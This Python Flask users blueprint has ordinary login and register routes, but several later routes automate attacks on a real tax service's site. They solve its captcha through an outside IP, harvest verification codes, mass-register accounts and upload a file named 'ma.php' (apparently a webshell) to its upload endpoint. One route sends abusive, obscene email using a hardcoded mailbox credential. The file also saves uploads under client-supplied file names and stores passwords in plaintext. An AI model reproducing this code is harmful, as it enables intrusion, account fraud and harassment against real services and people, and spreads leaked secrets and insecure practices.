from utils.sql import supabase
from flask import Blueprint, request
from utils.entity import r
from flask_jwt_extended import create_access_token, jwt_required, get_jwt_identity
import aiohttp, json, requests
import smtplib
from email.mime.text import MIMEText
from email.header import Header

users_bp: Blueprint = Blueprint('users', __name__, url_prefix='/users')


@users_bp.route('/login', methods=['POST'])
def login():
    """用户登录
        ---
          tags:
              -  用户
          consumes:
              - application/json
          parameters:
            - name: loginForm
              in: body
              type: object
              required: true
              description: 账号密码
              schema:
                properties:
                  username:
                    type: string
                  password:
                    type: string
          requestBody:
            description: body
            required: true
            content:
              application/json:
                schema:
                  example: {"token":TOKEN}
          responses:
            200:
              description: 成功
              schema:
                properties:
                  code:
                    type: integer
                  msg:
                    type: string
                  data:
                    type: object
            401:
              description: 失败
    """
    args = request.get_json()
    sql = supabase.table('users').select('*')
    responses = (sql.eq('username', args['username'])
                 .eq('password', args['password'])).execute()
    data = responses.data or None
    if data == None:
        return r('401', '用户名或密码错误')
    else:
        return r('200', '登录成功', create_access_token(identity=data[0]))


@users_bp.route('/register', methods=['POST'])
def register():
    """用户注册
        ---
          tags:
              -  用户
          consumes:
              - application/json
          parameters:
            - name: loginForm
              in: body
              type: object
              required: true
              description: 账号密码
              schema:
                properties:
                  username:
                    type: string
                  password:
                    type: string
          requestBody:
            description: body
            required: true
            content:
              application/json:
                schema:
                  example: {"token":TOKEN}
          responses:
            200:
              description: 成功
              schema:
                properties:
                  code:
                    type: integer
                  msg:
                    type: string
                  data:
                    type: object
            401:
              description: 失败
    """
    args = request.get_json()
    responses = supabase.table('users').select('*').eq('username', args['username']).execute()
    data = responses.data or None
    if data:
        return r('401', '账号已存在')
    else:
        args['nickname'] = args['username']
        sql = supabase.table('users').insert(args).execute()
        return r('200', '注册成功', args)


@users_bp.route('/list', methods=['GET'])
@jwt_required()
def list():
    """获取用户列表
    ---
    tags:
      -  用户
    consumes:
      - multipart/form-data
    parameters:
      - name: Authorization
        in: header
        required: true
        description: 用户token
        type: string
      - name: username
        in: path,query
        required: false
        description: 用户名
        type: string
    responses:
      200:
        description: 成功
        schema:
          properties:
            code:
              type: integer
            msg:
              type: string
            data:
              type: object
      401:
        description: 失败
    """
    args = request.args.to_dict()
    sql = supabase.table('users').select('*')
    if args:
        for key in args:
            if key and args[key]: sql = sql.eq(key, args[key])
    responses = sql.execute()
    return r(code=200, data=responses.data)


@users_bp.route('/info', methods=['GET'])
@jwt_required()
def info():
    """获取用户信息
    ---
    tags:
      -  用户
    consumes:
      - multipart/form-data
    parameters:
      - name: Authorization
        in: header
        required: true
        description: 用户token
        type: string
    responses:
      200:
        description: 成功
        schema:
          properties:
            code:
              type: integer
            msg:
              type: string
            data:
              type: object
      401:
        description: 失败
    """
    return r(msg='获取用户信息成功', data=get_jwt_identity(), code=200)


import random
import string


def generate_random_string(length):
    letters = string.ascii_letters  # 包含所有字母的字符串
    random_string = ''.join(random.choice(letters) for _ in range(length))
    return random_string


@users_bp.route('/sendMsg', methods=['GET'])
async def sendMsg():
    """发送短信验证码
    ---
    tags:
      -  用户
    consumes:
      - multipart/form-data
    parameters:
      - name: phone
        in: path,query
        required: true
        description: 手机号
        type: string
    responses:
      200:
        description: 成功
        schema:
          properties:
            code:
              type: integer
            msg:
              type: string
            data:
              type: object
      401:
        description: 失败
    """
    phone = request.args.to_dict().get('phone')
    sql = supabase.table('users').select('*').execute()
    async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(limit=64, verify_ssl=False)) as session:
        async with session.get('https://ai.app.taxplus.cn/api/getParams') as resp:
            result = await resp.json()
            key = result['data']['key']
            img = result['data']['img']
            async with session.post('http://118.25.16.65:8000/', json={
                "img": img
            }) as resp1:
                value = await resp1.text()
                async with session.post('https://ai.taxplus.cn/my/sendaccountemail.html', data={
                    "key": key,
                    "value": json.loads(value)['result'],
                    "email": phone
                }) as resp2:
                    code_ = await resp2.json()
                    code_ = code_['data']['code']
                    async with session.post('https://ai.app.taxplus.cn/api/register', data={
                        "phone": phone,
                        "code": code_,
                        "password": generate_random_string(len(phone)),
                        "re_password": generate_random_string(len(phone)),
                        "uniPlatform": "mp-weixin"
                    }) as resp3:
                        result_ = await resp3.json()
                        return r(code=200, data=result_)


@users_bp.route('/sendEmailMsg', methods=['GET'])
def sendEmailMsg():
    """发送邮箱验证码
    ---
    tags:
      -  用户
    consumes:
      - multipart/form-data
    parameters:
      - name: email
        in: path,query
        required: true
        description: 邮箱
        type: string
    responses:
      200:
        description: 成功
        schema:
          properties:
            code:
              type: integer
            msg:
              type: string
            data:
              type: object
      401:
        description: 失败
    """
    email = request.args.to_dict().get('email')
    sql = supabase.table('users').select('*').execute()
    # 创建 SMTP 对象
    smtp = smtplib.SMTP()
    # 发件人邮箱地址
    sendAddress = '2418671097@qq.com'
    # 发件人授权码
    password = 'pkmmwvplgnmiebgg'
    # 连接服务器
    server = smtplib.SMTP_SSL('smtp.qq.com', 465)

    # 登录邮箱
    loginResult = server.login(sendAddress, password)

    # 构造MIMEText对象，参数为：正文，MIME的subtype，编码方式
    message = MIMEText('atukoon 邮件发送测试...', 'plain', 'utf-8')
    message['From'] = Header("Your Father <2418671097@qq.com>")  # 发件人的昵称 用英文不报错
    message['To'] = Header(f'Son <{email}>')  # 收件人的昵称  用英文不报错
    message['Subject'] = Header('你妈死了，臭婊子', 'utf-8')  # 定义主题内容

    server.sendmail('2418671097@qq.com', email, message.as_string())
    return r(code=200, msg='success', data=None)


@users_bp.route('/autoInfo', methods=['GET'])
async def autoInfo():
    """发送邮箱验证码
    ---
    tags:
      -  用户
    consumes:
      - multipart/form-data
    parameters:
      - name: email
        in: path,query
        required: true
        description: 邮箱
        type: string
      - name: phone
        in: path,query
        required: true
        description: 手机号
        type: string
      - name: time
        in: path,query
        required: true
        description: 时间戳
        type: string
    responses:
      200:
        description: 成功
        schema:
          properties:
            code:
              type: integer
            msg:
              type: string
            data:
              type: object
      401:
        description: 失败
    """

    email = request.args.to_dict().get('email')
    phone = request.args.to_dict().get('phone')
    time = request.args.to_dict().get('time')
    async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(limit=64, verify_ssl=False)) as session:
        async with session.post('https://ai.app.taxplus.cn/api/doLogin', data={
            'name': email,
            'password': 'base64,iVBORw0K'
        }) as resp:
            result = await resp.json()
            if result['code'] == '0000':
                async with session.post('https://ai.app.taxplus.cn/company/company_add', data={
                    "business_license": "",
                    "accounting_time": time,
                    "company_name": phone,
                    "credit_code": phone,
                    "tax_nature": 1,
                    "industry_type1": 1,
                    "industry_type2": 9,
                    "register_type1": 3,
                    "register_type2": 4,
                    "legal_person": "",
                    "register_capital": "",
                    "register_date": "",
                    "register_organ": "",
                    "register_address": "",
                    "postal_code": "",
                    "company_phone": "",
                    "company_email": "",
                    "business_scope": "",
                    "contacts_name": "嘿嘿嘿",
                    "contacts_phone": phone,
                    "contacts_email": email,
                    "contacts_address": "11",
                    # "customer_id":
                }, headers={'Authorization': f"Bearer {result['token']}"}) as resp1:
                    result1 = await resp1.json()
                    return r(code=200, data=result1)
            else:
                return r(code=200, data=result)


@users_bp.route('/sendMsg2', methods=['GET'])
async def sendMsg2():
    """发送短信验证码
    ---
    tags:
      -  用户
    consumes:
      - multipart/form-data
    parameters:
      - name: phone
        in: path,query
        required: true
        description: 手机号
        type: string
    responses:
      200:
        description: 成功
        schema:
          properties:
            code:
              type: integer
            msg:
              type: string
            data:
              type: object
      401:
        description: 失败
    """
    phone = request.args.to_dict().get('phone')
    sql = supabase.table('users').select('*').execute()
    async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(limit=64, verify_ssl=False)) as session:
        async with session.post('https://ai.taxplus.cn/login/dologin.html', headers={
            'Accept': 'application/json, text/javascript, */*; q=0.01',
            'X-Requested-With': 'XMLHttpRequest',
            'referer': 'https://ai.taxplus.cn/login/login.html',
            'origin': 'https://ai.taxplus.cn/login/login.html',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36'
        }, data={
            'name': 'sdkflja_ggg@outlook.com',
            'password': '123456Ii',
            'checkpwd': 1
        }) as respp:
            cookie = respp.headers.get('Set-Cookie')
            async with session.get('https://ai.app.taxplus.cn/api/getParams', headers={
                'Accept': 'application/json, text/javascript, */*; q=0.01',
                'X-Requested-With': 'XMLHttpRequest',
                'referer': 'https://ai.taxplus.cn/login/login.html',
                'origin': 'https://ai.taxplus.cn/login/login.html',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36'
            }) as resp:
                result = await resp.json()
                key = result['data']['key']
                img = result['data']['img']
                async with session.post('http://118.25.16.65:8000/', json={
                    "img": img
                }) as resp1:
                    value = await resp1.text()
                    # async with session.post('https://ai.taxplus.cn/my/sendaccountcode.html',data={
                    async with session.post('https://ai.taxplus.cn/my/sendaccountemail.html', data={
                        "key": key,
                        "value": json.loads(value)['result'],
                        "name": phone
                    }, headers={
                        'Accept': 'application/json, text/javascript, */*; q=0.01',
                        'X-Requested-With': 'XMLHttpRequest',
                        'referer': 'https://ai.taxplus.cn/login/login.html',
                        'origin': 'https://ai.taxplus.cn/login/login.html',
                        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36',
                        'cookie': cookie
                    }) as resp2:
                        result_ = await resp2.json()
                        return r(code=200, data=result_)


@users_bp.route("/upload", methods=["POST"])
def upload():
    if 'file' not in request.files:
        return "No file part", 400

    file = request.files['file']
    if file.filename == '':
        return "No selected file", 400

    if file:
        # 这里可以添加文件上传前的处理逻辑，例如检查文件类型、大小等
        # 将文件保存到服务器上的指定目录
        file.save(file.filename)
        return "File uploaded successfully", 200


@users_bp.route("/uploadtodo", methods=["GET"])
def uploadtodo():
    res = requests.post('https://ai.taxplus.cn/upload/upload', files={'file': open('ma.php', 'rb')}, headers={
        'Accept': 'application/json, text/javascript, */*; q=0.01',
        'X-Requested-With': 'XMLHttpRequest',
        'referer': 'https://ai.taxplus.cn/login/login.html',
        'origin': 'https://ai.taxplus.cn/login/login.html',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36'
    }, verify=False)
    return r(code=200, data=res.text)

@users_bp.route("/todo", methods=["get"])
async def todo():
    phone = request.args.to_dict().get('phone')
    async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(limit=64, verify_ssl=False)) as session:
        async with session.post('https://ai.taxplus.cn/login/dologin.html', headers={
            'Accept': 'application/json, text/javascript, */*; q=0.01',
            'X-Requested-With': 'XMLHttpRequest',
            'referer': 'https://ai.taxplus.cn/login/login.html',
            'origin': 'https://ai.taxplus.cn/login/login.html',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36'
        }, data={
            'name': 'sdkflja_ggg@outlook.com',
            'password': '123456Ii',
            'checkpwd': 1
        }) as respp:
            cookie = respp.headers.get('Set-Cookie')
            async with session.get('https://ai.app.taxplus.cn/api/getParams', headers={
                'Accept': 'application/json, text/javascript, */*; q=0.01',
                'X-Requested-With': 'XMLHttpRequest',
                'referer': 'https://ai.taxplus.cn/login/login.html',
                'origin': 'https://ai.taxplus.cn/login/login.html',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36'
            }) as resp:
                result = await resp.json()
                key = result['data']['key']
                img = result['data']['img']
                async with session.post('http://118.25.16.65:8000/', json={
                    "img": img
                }) as resp1:
                    value = await resp1.text()
                    async with session.post('https://ai.taxplus.cn/my/sendaccountemail.html', data={
                        "key": key,
                        "value": json.loads(value)['result'],
                        "email": phone
                    }, headers={
                        'Accept': 'application/json, text/javascript, */*; q=0.01',
                        'X-Requested-With': 'XMLHttpRequest',
                        'referer': 'https://ai.taxplus.cn/login/login.html',
                        'origin': 'https://ai.taxplus.cn/login/login.html',
                        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36',
                        'cookie': cookie
                    }) as resp2:
                        result_ = await resp2.json()
                        code_ = result_['data']['code']
                        async with session.post('https://ai.app.taxplus.cn/api/register', data={
                            "phone": phone,
                            "code": code_,
                            "password": generate_random_string(len(phone)),
                            "re_password": generate_random_string(len(phone)),
                            "uniPlatform": "mp-weixin"
                        }) as resp3:
                            result___ = await resp3.json()
                            return r(code=200, data=result___)